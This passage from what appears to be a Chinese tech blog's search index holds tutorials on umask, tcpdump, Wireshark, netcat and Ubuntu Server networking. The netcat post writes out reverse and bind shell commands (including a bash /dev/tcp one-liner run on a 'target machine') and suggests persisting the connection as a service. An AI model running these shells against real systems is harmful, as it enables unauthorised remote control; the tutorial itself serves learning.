src=\"http://image.xpshuai.cn/20200318202916501_30856.png\" />\n\n\n\n## <font color=red>权限管理</font>\n###### 掩码\n\n决定文件和目录的`默认权限`  \n\t- 文件默认权限：`666`-掩码（如果掩码为002, 6-2=4，权限就为664）\n\t- 文件夹默认权限：`777`-掩码（如果掩码为002, 7-2=5，权限就为775）\n\n命令：`umask`查看当前掩码\n修改掩码命令：`umask 007`（临时性的）\n**长久修改：**\n配置文件`vi /etc/login.defs`\n```\n# 配置其中umask\nUMASK \t022   # 属主的掩码0，数组的掩码2，其他用户的掩码2\nUSERGROUPS_ENAB\tyes  # 改为yes，属主的掩码来覆盖数组的掩码\n# 要想使得真正的权限与umask设置的一致：\nF1.可以把上面的改为no\nF2.设置用户账号名称和组账号名称不一样，让用户id和组id也不一样（推荐这种方式修改）\nsudo usermod -g users user01 # 把用户的主组改为users\n\n```\n\numask\n\t002\t\t\t用户名与组名相同、UID与GID相同\n\numask\n\t027     \t\t通常设置027就行\n\n\n\n","tags":["账号管理"],"categories":["Linux"]},{"title":"工具 - tcpdump使用&过程文档记录","url":"%2Fposts%2F13625%2F","content":"\n\n\n\n\n# <font color=red>工具-tcpdump使用</font>\n\n- No_GUI的抓包分析工具\n\n- Linux、Unix系统默认安装\n\n\n###### 抓包\n默认只抓68个字节\n```bash\n#参数:  -i网卡    -s 抓包大小   -w保存到文件\ntcpdump -i ens33 -s 0 -w file.pcap\n\n#抓取指定端口的流量\ntcpdump -i ens33 port 22\n```\n\n###### 读取抓包文件\n```bash\n#查看保存到文件中的数据包\ntcpdump -r file.pcap\n#参数： -A 以ascii码形式显示内容\ntcpdump -A -r file.pcap\n#参数： -X 以16进制形式显示内容\ntcpdump -X -r file.pcap\n```\n\n###### 显示筛选器\n```bash\n#利用OS自带的管道\n#参数： -n 以ip地址显示，不显示域名；   显示第三列(ip+端口)并去重\ntcpdump -n -r file.pcap | awk '{print $3}' | sort -u\n\n#tcpdump自身的显示筛选： 只显示源地址为这个的\ntcpdump -n -src host 192.168.0.1 -r file.pcap\n#只显示目的地址为这个的\ntcpdump -n -dst host 192.168.0.130 -r file.pcap\n#按端口号筛选\ntcpdump -n port 53 -r file.pcap\n#显示udp的53端口\ntcpdump -n udp port 53 -r file.pcap\n#显示tcp的\ntcpdump -n tcp port 80 -r file.pcap\n#显示icmp的\ntcpdump -n icmp -r file.pcap\n#显示ip的\ntcpdump -n ip -r file.pcap\n#-X以16进制显示\ntcpdump -nX port 80 -r file.pcap\n\n```\n\n###### 高级筛选\nTCP的包头：\n<img src=\"http://image.xpshuai.cn/20200315180543581_5798.png\" />\n可以看到上图中Flag中的标志位  \ntcpdump可以对如此细致的东西进行筛选  \n\n```bash\n#只显示第13号字节中值转换为10进制为24(push+ack)的数据包\ntcpdump -A -n 'tcp[13]24' -r file.cap\n\n```\n\n\n\n>PS:  nc、Wireshark、tcpdump必须非常熟练地掌握\n\n\n\n# <font color=red>过程文档记录工具 </font>\n介绍几个kali中自带的\n\n###### 1.Dradis\n基于web的工具\n- 短期临时小团队资源共享\n- 各种插件导入文件（兼容很多种扫描器日志的导入）\n\n**使用：**\nwebapp  \n初始化后，输入密码即可登录\n导入导出(支持不同文件格式)扫描器日志\n（具体自己操作一下就知道了）\n\n\n###### 2.Keepnote\n层级化记录信息：\n不同项目可以使用不同文件夹，子文件\n可以导出\n\n###### 3.Truecrypt\n一款`加密工具`\n2014年停止更新（官方原因是安全性不够，但实际使用却依然较安全）\n\n**选择加密区域：**\n1.创建加密文件（create volume）\n2.创建卷(全盘加密)  \n\n**选择加密方式**\n1.标准加密卷：\n2.隐藏加密卷： 若被人强迫输入加密密码，可以输入一个密码打开后什么都没有(outer volume), 而重要信息存在一块隐藏空间(hidden volume)里面。hidden volume大小不能超过outer volume。【首先指定外部卷(迷惑别人的)的大小(尽量大一些,包括内部卷的大小)和密码, 内部机密卷存在于外部卷的空间中(设置它的大小和密码)】\n\n\n选择加密算法（也可以多种加密算法叠加用）  \n设置密码  \n指定卷格式  \n生成随机key(用鼠标再屏幕上乱滑,划得月乱，key越复杂)\n\n\n**使用：**\n选择挂载的文件，就像挂载一块硬盘分区一样\n使用完成后：`dismount`或`dismount all`就行\n\n对于隐藏加密卷: 输入外部卷的密码就是外部卷的内容(存储大小也隐藏了另一部分)，输入内部卷的密码打开的就是内部卷的内容\n\n\n\n\n\n\n\n","tags":["tcpdump"],"categories":["渗透测试"]},{"title":"工具 - Wireshark使用","url":"%2Fposts%2F56492%2F","content":"\n\n\n<img src=\"http://image.xpshuai.cn//title.png\"></img>\n\n<!-- more -->\n\n# Wireshark\n\n## 简介\n\n- 抓包嗅探协议分析\n- 安全专家必备技能\n- 抓包引擎(wireshark本身是分析数据包, 抓包靠下面两个引擎)\n    - Linux上： Libpcap\n    - Windows上： Winpcap\n- 解码能力（衡量抓包软件好坏的重要标准）\n\n\n## 基本使用方法\n###### 启动\n\n###### 捕获->选项-> ... ... \n**选择抓包网卡**\n<img src=\"http://image.xpshuai.cn/20200314214656188_15241.png\" />\n\n**混杂模式**\n勾选上之后，如果数据包不是发送给我指定这个网卡的，也会被抓取\n\n**抓包筛选器**\n指定抓什么包，不抓什么包\n\n###### 实时抓包\n就是主界面\n\n###### 保存和分析捕获文件\n先停止，再保存(可以选择格式, 尽量使用`.pcap`格式)，压缩等, 下次可以导入已经抓取的数据包文件\n\n###### 首选项\n编辑->首选项   -> 可以自己根据需要修改和定制界面布局\n<img src=\"http://image.xpshuai.cn/20200314215811593_19130.png\" />\n<img src=\"http://image.xpshuai.cn/20200314215743991_3733.png\" />\n\n\n#### 筛选器\n- 过滤干扰的数据包\n- 抓包筛选器(捕获, 选项里面那个)\n- 显示筛选器(主界面那个, 更多使用)    -- 常用语法\n\n可以单独选择，也可以叠加(and, or)上面的条件进行筛选：\n<img src=\"http://image.xpshuai.cn/20200314220435486_29854.png\" />\n<img src=\"http://image.xpshuai.cn/20200314220819061_8554.png\" />\n\n\n\n## 常见协议数据包\n\n数据包的分层结构显示\n\n###### <font color=red>ARP</font>\n<img src=\"http://image.xpshuai.cn/20200315135242728_2582.png\" />\n<img src=\"http://image.xpshuai.cn/20200315135851907_10980.png\" />\n\n###### <font color=red> IP</font>\n\n**Protocol字段：** 表示上层是： udp--> 17， tcp--> 6, icmp -->2, igmp -->2\n四层有好多中协议对应不同的数字\nHeader checksum字段：校验和, 每两位进行异或\n<img src=\"http://image.xpshuai.cn/20200315141145151_10461.png\" />\ntcp和udp一般不会有`option`字段（视情况而定）\n\n\n###### <font color=red> TCP</font>\n<img src=\"http://image.xpshuai.cn/20200315141900321_8252.png\" />\n<img src=\"http://image.xpshuai.cn/20200315142047940_28399.png\" />\n\n**附：**\n三次握手\n<img src=\"http://image.xpshuai.cn/20200315142429852_2643.pn\" />\n\n四次挥手\n<img src=\"http://image.xpshuai.cn/20200315142522647_28638.png\" />\n\n###### <font color=red> UDP </font>\nudp和tcp的类似，自己实践能看懂\nudp开销更小\n<img src=\"http://image.xpshuai.cn/20200315142800334_28041.png\" />\n\n\n###### <font color=red> DNS </font>\n应用层协议，基于udp\n<img src=\"http://image.xpshuai.cn/20200315143306840_10579.png\" />\n\n\n###### <font color=red> HTTP </font>\n<img src=\"http://image.xpshuai.cn/20200315143952274_22660.png\" />\n<img src=\"http://image.xpshuai.cn/20200315144406111_24695.png\" />\n\n\n###### <font color=red> ftp </font>\n这里没ftp服务器就先不放图了\nftp也是一个应用层协议\n\n>wishark默认是用端口区分协议(假设我们手动把http不开在80端口，wireshark分不清非标准端口的, 需要我们手动修改.如下图.)\n\n<img src=\"http://image.xpshuai.cn/20200315144657089_4217.png\" />\n\n\n\n\n#### 数据流\n比如访问一个网页, 往往产生很多数据包\nwireshark提供了<code>数据流</code>\n\n- http\n- smtp\n- pop3\n- ssl 等\n\n**操作(以http为例)：**\n<img src=\"http://image.xpshuai.cn/20200315145059801_20372.png\" />\n按照上图操作完后，会来到数据流的界面，如下：\n<img src=\"http://image.xpshuai.cn/20200315145205546_28877.png\" />\n\n\n\n## 信息统计\n\n**1.查看导入数据包文件摘要信息**\n导入数据包文件，打开“统计”->“文件属性”：可以看到一些摘要性的信息\n\n**2.节点数**\n打开“统计”->“endpoint”： 可以以ip地址区分/udp有多少/二层的包头/其他标准区分 节点的个数等\nTx表示发送, Rx表示接收的数据包\n\n**3.协议分布**\n打开“统计”->“协议分级”：可以看到每个协议里面什么协议的占用百分比(DNS流量占用一般都很小,否则很有可能出现异常)\n\n**4.包大小分布**\n打开“统计”->“分组长度”：可以看到大包多还是小包多\n\n**5.会话连接**\n打开“统计”->“conversations”：可以看到哪两台机器之间数据包会话传送最多啥的\n\n**6.解码方式**\n对于非默认端口的数据包，wiresharl只会按端口区分的\n右键, 手动decode为指定的协议， 这样wireshark就会按正确的协议来解析\n\n>需要熟悉不同协议数据包的内容, 防止手动解析错误\n\n**7.专家系统**\n“分析” -> \"专家系统\":  可能自动给我们一些提示\n\n>思路：如果很多个数据包，先从统计信息入手，分析出重点，找出方向。然后筛选出来，逐步分析包的内容\n\n\n\n\n## 实践\n- 抓包对比nc、ncta加密与不加密的流量\n- 企业抓包部署方案  (Wiershark也有不足，大型网络还是需要商业化的软件)\n    - Sniffer\n    - Cace / riverbed （大部分还是基于wireshark进行了二次开发，改名了应该, 如果需要去网上找吧）\n    - Cascad pilot\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Wireshark"],"categories":["渗透测试"]},{"title":"工具 - netcat使用","url":"%2Fposts%2F13625%2F","content":"\n\n\n# netcat使用\n\n\n## 简介\n- 侦听模式/传输模式\n- 可以替代telent  / 获取banner信息\n- 传输文本信息\n- 传输文件/目录\n- 加密传输文件\n- 远程控制/木马\n- 加密所有流量\n- 流媒体服务器\n- 远程克隆硬盘\n\n\n## 基本用法\n####  <font color=red>1. 实现telnet / banner</font>\n```bash\n# 题外话:追踪路由\nmtr 114.114.114.114 \n\n## nc作为客户端：\n# 参数 -v  显示详细信息 \n# 参数  -n  如果是域名,不进行域名解析(建议直接跟ip地址)\nnc -nv 1.1.1.1 110   # 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令）\nnc -nv 1.1.1.1 25    # smtp服务器\nnc -nv 1.1.1.1 80    # 探测80端口(都可进行交互的命令)\n\n```\n\n####  <font color=red>2.传输文本信息</font>\n```bash\n# 可以做聊天用\n# 一台作为服务端    -l 监听, -p 端口\nnc -l -p 4444\n# 另一台作为客户端去连接服务端\nnc -nv 1.1.1.1 4444\n\n```\n![](http://image.xpshuai.cn/nc_use.png)\n\n###### 用途：\n**远程电子取证** (原则:尽可能少修改被审计系统的状态，避免影响证据)\n就可以用`nc`来操作:\n我的电脑: `nc -l -p 3333`  监听\n被审计系统:`ls -l | nc -nv 1.1.1.1 3333` 输出到我的电脑\n\n我的电脑: `nc -l -p 3333 > ps.txt`   输出结果重定向到文件\n被审计系统:`ps -ef | nc -nv 1.1.1.1 3333 -q 1`    参数-q: 输出完成之后过1秒就断开\n\n题外话：`lsof` 查看已经打开的文件\n\n\n\n####  <font color=red>3.传输文件/目录</font>\n###### 传输文件\n```bash\n# 客户端向服务端传输  （正向） \nA： nc-lp 3333 > 1.mp4\nB:  nc -nv 1.1.1.1 3333 < 1.mp4 -q 1\n# 或者, 服务端向客户端传输文件  （反向）\nA:  nc -q 1 -lp 3333 < a.mp4\nB:  nc -nv 1.1.1.1 3333 > 2.mp4\n```\n\n###### 传输目录\n```bash\n# 正向(服务端先打包再传给客户端,注意小横线别遗漏)\nA:  tar -cvf - music/ | nc -lp 3333 -q 1\nB:  nc -nv 1.1.1.1 3333 | tar -xvf -     # 先接收再解包\n```\n\n###### 加密传文件\n```bash\nA： nc -lp 3333 | mcrypt --flush -Fbqd -a rijndael-256-m ecb > 1.mp4     # 接收，解密\nB： mcrypt --fulsh -Fbq -a rijndael-256-m ecb < a.mp4 | nc 1.1.1.1 3333 -q 1   # 加密，传送\n# 需要输入加密秘钥，解密秘钥\n# 不是nc的加密功能，是操作系统的加密命令，可以自行安装\n```\n\n#### <font color=red>4.流媒体</font>\n```bash\n#把视频流输出到B端\nA:  cat 1.mp4 | nc -lp 3333\nB:  nc -nv 1.1.1.1 3333 | mplayer -vo x11 -cache 3000 -\n#接收视频流，输出给指定播放器和缓存进行播放\n```\n\n#### <font color=red>5.端口扫描</font>\n>以客户端角色\n```bash\n#并非擅长端口扫描\n#参数 -z 扫描参数，只判断是否开放（默认tcp）\nnc -nvz 1.1.1.1 1-65535\n#参数 -u  扫描udp服务的端口 （不太准确）\nnc -nvzu 1.1.1.1 1-1024\n```\n\n#### <font color=red>6.远程克隆硬盘</font>\n**远程电子取证**，可以将目标服务器硬盘远程复制(`块`级别的备份,`磁盘磁道的状态原原本本的复制`)，或者内存(内存中运行的病毒进程)\n```bash\nA:  nc -lp 3333 | dd of=/dev/sda\nB:  dd -if=/dev/sda | nc -nv 1.1.1.1 3333 -q 1\n```\n\n####  <font color=red>7.远程控制</font>\n参数: -c \n**正向：**   目标机器作为服务端监听, 把bash传给我\n```bash\nA:  nc -lp 3333 -c bash   #目标机器\nB:  nc 1.1.1.1 3333\n```\n**反向：**    我的机器作为服务端, 让目标机器作为客户端主动连接我(客户端把bash传给服务器端)\n```bash\nA:  nc -lvp 3333       \nB:  nc 1.1.1.1 3333 -c bash    #目标机器\n\n#假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell\n目标机器： bash -i >& /dev/tcp/192.168.41.133/2223 0>&1\n攻击方： nc -lvvp 2223\n```\n\n>Note: Windows用户把bash改为cmd\n\n> 反向连接用的多， 因为好多都限制进入的流量而不太多限制出去的流量(根据他允许的端口调整,比如dns)\n\n> 长久维持会话： 写成脚本作为系统服务，让目标机器已启动就连接我\n\n\n\n## ncat 命令\n<font color=red> **nc缺陷：**</font>\n- nc缺乏加密能力：是数据是明文传输（容易被别人嗅探）\n- 缺乏身份验证能力：端口如果一直向外开放，容易被他人连接窃取当做肉鸡\n- 不同系统/平台的nc参数功能不尽相同（自己 -h 查看帮助文档和测试）\n\n<font color=red> **ncat 命令**</font>\n是包含在nmap工具包中里面的一个东西(弥补了nc缺乏加密和身份验证的不足)\n\n正向连接：\n```bash\n#先进行了秘钥交换和加密\n#被控端(服务器端)   -allow允许连接的ip， 端口, ssl加密\nA:  ncat -c bash -allow 192.168.1.20 -vnl 3333 --ssl\nB:  ncat -nv 192.168.1.19 3333 --ssl      #攻击端\n```\n\n## 其他\n... ...\n\n\n","tags":["nc"],"categories":["渗透测试"]},{"title":"ubuntu server-网络相关知识","url":"%2Fposts%2F9091%2F","content":"\n\n\n  \n\n## 网络原理\n\n<img src=\"http://image.xpshuai.cn/20200214100233476_240785919.png\" />\n\n`ping 127.0.0.1` 如果能通，说明本机的TCP/IP协议已经配置成功啦\n`arping `\n\n  \n\n## 网卡配置\n###### 网卡接口  \n-enp2s0 (最近使用)、eth0   （以前这么使用）\n\n```bash\n#wl 开头的是无线网卡\n\n# ifconfig 命令\n# 查看所有网卡\nifconfig -a\n    字段意义：MTU,发包，收包，`collisions`发生多少次冲突\n\n# ip 命令\n ip link     # 查看所有网卡和信息\n ip address\n\n# lshw   查看系统硬件命令\n# 只查看网卡的命令\nsudo lshw -class network\n\n```\n\n###### 管理网卡\n```bash\n# 查看网卡参数\nsud ethtool enp0s3\n  \n# -s   配置 ： speed 速度 半双工 \nsud ethtool -s duplex half | full speed 1000\n\n```\n\n###### 网络基本设置  \n```bash\n## 临时设置IP地址\nsudo ifconfig eth0 10.0.0.00 netmask 255.255.255.0\n# 24位掩码\nsudo ifconfig eth0 10.0.0.100/24\n# 设置网关 gw\nsudo route add default gw 10.0.0.1 eth0\n# 网段路由 add-net   （静态路由：去哪个网段，应该怎么转发）\nsudo route add-net 0.0.0.0 netmask 0.0.0.0 gw 1.1.1.1\n# 主机路由 add-host    \nsudo route add-host 2.2.2.2 gw 1.1.1.1\n  \n\n\n# 清除网卡配置\nip addr fulsh eth0\n\n# 向网络中要一个IP\nsudo dhcpclient\n\n# 禁用网卡\nsudo ifconfig eth0 down\n# 启用网卡\nsudo ifconfig eth0 up\n# 重启网络服务\nsudo systemctrl restart networking.service\n\n```\n\n\n\n###### 网卡配置文件\n`/etc/network/interfaces`\n\n```bash\n文件字段：\niface 网卡name inet 网络配置（loopback/dhcp/static）\n\n    sudo eth0\n    iface eth0 inet static|DHCP\n\n    # pre-up 系统启动中(网卡运行前)  设置为1000M，全双工\n    pre-up/sbin/ethtool -s eth0 speed 1000 duplex full\n\n```\n\n\n###### 动态获取IP地址\n```bash\n# sudo vim /etc/network/interfaces\nauto eth0\niface inet dhcp\n\n```\n\n\n###### 静态IP地址\n一般服务器是静态的IP\n```bash\n# sudo vim /etc/network/interfaces\nauto eth0\niface inet static\n    address 192.168.123.9\n    netmask 255.255.255.0        # 掩码\n    gateway 192.168.123.1        # 网关\n    dns-nameservers 192.168.123.1 202.99.96.68   # 一般dns地址写俩\n    # 上面是基本配置, 下面是额外其他配置项\n    broadcast 192.168.123.255   # 网段的广播地址\n    # dns-search  abc.com  # 如果属于某个dns域,就默认去找这个\n    up route add -net 172.16.0.0/24  gw 192.168.23.1 eth0   # 开机之后,添加一个网段(要指定具体网关)\n    mtu 1460   # 指定MTU 字节\n    # hwaddress 00:11:22:33:44:55   # 指定硬件mac地址\n    \n# 刷新,重启网络, 配置文件的网络生效(实在不行就重启计算机)\nsudo ip address fulsh eth0 \nsudo systemctrl restart networking.service\n\n```\n\n<img src=\"http://image.xpshuai.cn//20200214114820323_1273216811.png\"></img>\n指定路由\n清除信息\nip addr flush ens32\n\n\n> Note： VmWare对网络的支持要好于VirtualBox(比如有些网络的配置可能有限制)\n\n\n\n###### Ubuntu 1804配置静态ip\n\nubuntu18.04 server，启用了新的网络工具`netplan`，对于命令行配置网络参数跟之前的版本有比较大的差别，现在介绍如下：\n\n1. 其网络配置文件是放在`/etc/netplan/50-cloud-init.yaml`, 缺省是用dhcp方式，如果要配置静态地址，则需要修改此文件的想关内容，见如下的例子：\n\n```bash\nnetwork:\n\tversion: 2\n    ethernets:\n        ens33:\n            addresses: [192.168.1.20/24]\t# 可以是这种数组形式[1.1.1.1, 192.168.1.20/24]也可以是下面那样\n            dhcp4: false\n            gateway4: 192.168.1.1\n            nameservers:\n                addresses: [192.168.1.1]\n                optional: true\n            \n```\n\n或者下面这个格式(可能更清晰，有`ipv6`)\n\n```bash\n# the datasource.  Changes to it will not persist across an instance.\n# To disable cloud-init's network configuration capabilities, write a file\n# /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:\n# network: {config: disabled}\n# 前几项必填，其他根据需要填写\nnetwork:\n    version: 2\n    ethernets:\n        eth0:\n            addresses:\n                - 公共ipv4地址/20掩码\n                - 私有ipv4地址/16\n                - 公共ipv6地址/64\n            dhcp4: false\n            gateway4: \"公共ipv4网关\"\n            gateway6: 公共ipv6网关\n            match:\n                macaddress: MAC地址(不必须)\n            nameservers:\t# DNS\n                addresses:\n                    - \"67.207.67.2\"\n                    - \"67.207.67.3\"\n            set-name: eth0\n```\n\n  \n\n2.使其生效的方法：\n\n```bash\nsudo netplan apply\n```\n\n  \n\n如果配置有问题会报错，如果没问题，则会新的配置会立即生效。\n\n> 注意：此方法只是针对ubuntu18.04 Server版，对于18.04 desktop它缺省是使用NetworkManger来进行管理，可使用图形界面进行配置，其网络配置文件是保存在：/etc/NetworkManager/system-connections目录下的，跟Server版区别还是比较大的。\n\nnetplan 工具还有其它比较丰富的功能，详细可参见其的说明文档。\n\n\n\n  \n\n## DNS配置\n###### DNS配置文件  \n`/etc/resolve.conf`      \n\n```bash\n/etc/resolve.conf    # DNS设置（软连接）\n格式:\n    nameserver 114.114.114.114\n    nameserver 127.0.0.53\n    options edns0\n    search www.tendawifi.com\n\n```\n\n\n###### 主机名解析\n1.配置文件 `/etc/hosts`    优先级别`高`于resolve.conf里面的dns服务器的信息  \n\n```bash\n# ip 和名称做解析\n127.0.0.1 localhost\n192.168.0.111 www.qq.com\n# 现在这里找映射，有的话就不去resolve里面找了\n\n```\n\n2.配置文件 `/etc/nsswitch.conf`        名称解析顺序配置文件  \n\n```bash\n# 按照优先级先后排序来解析  （前面的不满足，才调用后面的）\n- files        /etc/hosts\n- Resolve        全称systemd-resolved.service(缓存、localhost、本机名)   （默认安装）\n- [NOTFOUND=return]        结果即权威  （正则表达式）  （当找不给我到的之后，返回）\n- dns                    dns服务器（resolve文件配置的那些）\n- mdns4_minimal            MulticastDNS(多播dns服务)     现在很多dns厂家用的就是多播dns服务\n\n# \nhosts:          files mdns4_minimal [NOTFOUND=return] dns myhostname\n\n```\n\n> 关于解析优先级：有的攻击者会修改你hosts文件映射到自己的恶意网址，此时如果把dns的顺序放到hosts前面，他就利用不成了\n\n###### 查看路由  \n```bash\n# 路由信息\nroute -n\n\nnetstat -nr\n\n```\n\n  \n\n## 网桥配置\n>把服务器当交换机用实在是大材小用\n把多个以太网段以上层透明的方式连接在一起\n\n**应用场景： ** \n1.可做防火墙  \n2.可以做虚拟机的服务器（搭建云平台，进行虚拟化的时候）\n3.桥接有线网与无线网（比如我的笔记本：连接网线访问互联网，另外让别人通过我的电脑无线上网，相当于一个AP）\n4.链路荣誉容错（需启用STP）\n5.通过网桥管理工具实现 `bridge-utils`  \n\n<img src=\"http://image.xpshuai.cn//20200218132001375_1018333933.png\"></img>\n\n\n\n###### 在ubunut搭建网桥  \n在虚拟机添加2块网卡(一块NAT，另一块随便)  \n\n**安装网桥管理包： ** \n`sudo apt install bridge-utils ` \n\n**临时配置网桥： ** \n命令： `btctl ` \n\n```bash\nsudo btctl addr br0     # 添加一个网桥的网卡接口\nsudo btctl addif br0 eth0 eth1  # 往网桥接口添加2块网卡\n# sudo ifconfig eth0 down   # 把网卡down掉\nsudo ifconfig eth0 0.0.0.0 up    # 2者的ip变没了\nsudo ifconfig eth1 0.0.0.0 up\nsudo ifconfig br0 1.1.1.1/24 up   # 手动配置网桥网卡的ip并up\nsudo dhclient br0    # 或者 dhcp自动获取网桥网卡的ip地址\nsudo route add default gw 1.1.1.10    # 添加一个网关，就可以访问外网了\n```\n\n**持久配置网桥：**\n修改配置文件： `/etc/network/interfaces`  \n\n```bash\nauto eth0\niface eth0 inet manual\n\nauto eth1\niface eth1 inet manual\n\nauto br0\niface br0 inet dhcp   # dncp  ， 也可以static，下面手动配置address，netmask和gateway\nbridge_ports eth0 eth1  # 加入网卡\nbridge_stop off   #关闭生成树 ,也可以 on开启成树，参与生成树计算\n\n```\n修改保存，然后 重启网络服务/重启服务器  \n\n**查看网桥运行状态 ** \n`sudo brctl show`\n**查看mac情况**  \n`sudo brctl showmacs br0 `\n**查看生成树情况**  \n`sudo brctl showstp br0 `\n\n  \n\n## 网卡绑定   (经常使用)  \n> 还记得小时候这段一把筷子的故事吗\n\n实现多块网卡的绑定，实现高可用、负载均衡、更大发挥能力\n\n###### 一些常用称呼：\nBonding == Port Trunking == Link aggregation(链路聚合)  == Team\n\n###### 目的：  \n将多个物理网卡组合为一个逻辑网卡\n- 高可用、负载平衡、高吞吐量\n\n\n#### 配置：    \n\n在虚拟机做实验：先给虚拟机添加至少两块网卡    \n\n1.第一步  \n\n```bash\nsudo echo bonding >> /etc/modules        # 添加内核支持\nsudo modprobe bonding       # 手动加载内核(临时)， modeprobe加载bonding\nifconfig -a    # 可以看到自动生成了一个bonding0的网卡(但是没有up)\nsudo systemctl stop networking     \n# 永久配置，文件\n# sudo vim /etc/network/interfaces\nbounding    # 添加一个模块\n# 重启服务\nsudo systemctl restart networking     \n  \n```\n2.配置网卡配置文件    \n\n```bash\n# Mode 1 配置\n# sudo vim /etc/network/interfaces\nauto eth0 \niface eth0 inet manual\nbond-master  bond0    # 绑定到哪个bound上\nbond-primary  eth0    # 默认做的主的网卡\n\nauto eth01\niface eth01 inet manual\nbond-master  bond0      # 备的网卡，协商要绑定那个\n\n\nauto bond0\niface bond0 inet dhcp   # 让ip地址dhcp； 或者static 手动制定\nbond-mode   1    # 绑定模式   active-backup\nbond-miimon 100    # 故障检测间隔： 100ms\nbond-slaves none         # 指定作为的的成员的网卡, 这里写none是因为：加入在自己物理网卡片段里面写了\n  \n--\n# 重启服务\nsudo systemctl restart networking  \n  \n\n```\n\nPS: 绑定模式  \nbound-mode  \n\n```\n1     一个主，一个备(主的故障后才工作)  也叫： active-backup\n```\n\n\n#### 6种模式  \n###### Mode 0  ： round-robin(轮询)  \n- 网络流量（数据包） 顺序平均分配给Bond中所有物理网卡（可以同时使用三个网卡发送和接收数据）\n- 高可用（容错，一个坏了，另一个网卡接管）、负载均衡（多个网卡，单独是，就是拥有了多G的带宽）\n\n  \n\n###### Mode 1 : ative-backup  \n- Bond中只有一个网卡Active， 其他网卡全部Stanby（效率并不是很高）  \n- 对外只有一个网卡的MAC地址可见  \n- 高可用  \n实现不了负载均衡，有多个接口也没用  \n\n\n###### Mode 2:  balance-XOR\n- 根据源目的MAC/IP/Port进行计算，确定从哪个网卡发出（性能优于Mode0）\n- 高可用，负载均衡\n\n（XOR --- > 异或）  \n只要不出现故障，不改变mac地址，第一次使用的第一个物理网卡进行的通信，以后所有的通信都是继续使用第一个物理网卡\n流量不是平均的  \n\n\n###### Mode 3   broadcast  \n- 发包广播给Bond中所有网卡，提供最短的故障恢复时间，应用连接不中断  \n- 高可用  \n\n\n###### Mode 4   802.3ad（Dynamic link aggregation）\n- 链路聚合LACP组内的网卡使用相同速率、双工设置    \n- 要求：计算机安装ethtool；交换机支持IEEE802.3ad标准，并进行额外配置\n- 高可用、负载均衡  \n\n\n###### Mode 5    balance-tlb （Adaptive transmit load balancing）  \n- 隧道绑定不需要上连交换机额外配置，根据网卡负载出站负载均衡\n- 高可用、负载均衡  \n\n  \n\n\n###### Mode 6:   balance-alb (Adaptive load balance)  \n- Mode 5 + balance-rlb (入站流量负载均衡)  \n    - Bond驱动拦截本机的ARP响应包，使用不同网卡硬件MAC替换源MAC\n    - 不同的对端使用不同的服务器MAC地址，实现入站负载均衡\n - 不需要上连交换机额外配置  \n\n  \n\n###### 查看bond端口和状态  \n```\ncat /proc/net/bonding/bond0\n```\n\n###### Model 4 配置  \n```bash\n# sudo vim /etc/network/interfaces\nauto eth0     # 其他物理网卡配置项同\niface eth0 inet manual\nbond-master  boud0    # 绑定到哪个bound上\n\nauto bon\nd0\niface bond0 inet dhcp   # 让ip地址dhcp； 或者static 手动制定\nbond-mode 4    # 绑定模式   active-backup\nbond-miimon 100    # 故障检测间隔： 100ms\nbond-lacp-rate 1         # 每1s发送LACPDU（默认为0，即30s）\nbond-slaves eth0 eth1         # 指定作为的的成员的网卡\n\n\n```\n\n\n\n  \n\n## DHCP服务  \n通常给客户端自动分配IP地址  \n\n###### Dynamic Host Configuration Protocol\n- 透明的配置网络参数  \n- IP/掩码、网关、DNS、域名、时间服务器、打印服务器(常用的参数是前三个)\n- 通过地址租约循环使用IP地址（有租约期，循环利用）\n- 基于UDP， 标准使用 端口： 67(服务端)，68(客户端)\n\nps: 一般企业，dhcp都在核心交换机上，只有当企业网络非常大复杂时候，才会单独使用一个服务器来提供dhcp服务  \n\n**请求和分配步骤： ** \n1.客户端发生第一个广播(二层，因为此时还没有ip)，数据包：`dhcp discover`  \n2.dhcp服务器回复数据包`dhcp offer ` \n3.客户端就再发一个广播包`dhcp request ` \n4.服务器端发送数据包`ack`， 包含ip等参数，标记这个ip为已分配  \n\n\n###### 安装  \n1.在vmware上，打开虚拟网络设置，以vmnet8为例，关闭vmware自带的dhcp服务（如果同时有两台dhcp服务:使用响应快的服务提供的ip），将这台虚拟机使用nat，  \n让其他虚拟机都使用这台虚拟机的dhcp服务，把这个虚拟机修改为静态ip, 修改配置文件`/etc/network/inertface`到vmnet8的网段，`sudo ip addr fulsh eth0`清除原来配置，重启网络服务  \n\n2.安装dhcp服务的软件包  \n\n```bash\n# 这里用的isc的  \nsudo apt install isc-dhcp-server  \n```\n\n3.配置dhcp服务  \n\n>Note：能不安装的服务和软件就不要安装，反非必须，就不启用（缩小攻击面）  \n\n\n```bash\n##1.先修改配置文件1  \n#sudo vim /etc/default/isc-dhcp-server   # 指定启动DHCP服务的网卡\n    INTERFACE=\"eth0\"   # 要启动shcp的网卡name(一般是针对内网的那一块网卡)，可以多个网卡（空格隔开）\n    \n##2.再修改主配置文件（指定地址池和选项） \n#sudo vim /etc/dhcp/dhcpd.conf       \n#option只对dhcp的作用域起效；其他的很对整个服务器起效\n#一致的配置写在文件起始位置，其他的个性的单独设置在各个网段的位置\ndefault-lease-time 600;  #租约期限， 单位：s\nmax-lease-time 7200;  #最大租约期限(到达时间的一半，就刷新使用期；如果到达最大时间，就重新通过dhcp获取)\nauthoritative;   #启用之后，证明这个是权威的授权dhcp服务器（一般情况下，网络中如果出现其他的dhcp就不会影响了）\n#配置地址池(可以手动写，也可以在原注释的基础上配置) 网段\nsubnet 10.1.8.0 netmask 255.255.255.0 {\n    range 10.1.8.100 10.1.8.200;   #可分配的地址段\n    option routers 10.1.8.1;  #网关地址\n    option domain-name-servers 192.168.1.1,192.168.1.2;  #dns服务器地址，多个用逗号隔开; 一般配到这里就够了\n    option ntp-server 1.1.1.1;     #时间服务器\n    option domain-name \"local.lan\";   #统一的域名\n}\n  \n##3.重启服务\n  \n\n#客户端一些操作\nipconfig /all\nipconfig /release   # 释放这个ip\nipconfig /renew    #重新获取ip\n  \n```\n\n\n\n3.特殊情况(指定某个ip只分配给某台计算机，IP保留)    \n\n>通过MAC地址来识别  \n```bash\n#sudo vim /etc/dhcp/dhcpd.conf       \n  \nhost yourname {\n    hardware ethernet 00:11:22:33:44:55;\n    fixed-address 10.1.8.8;   #尽量用上面地址池以外的地址\n}  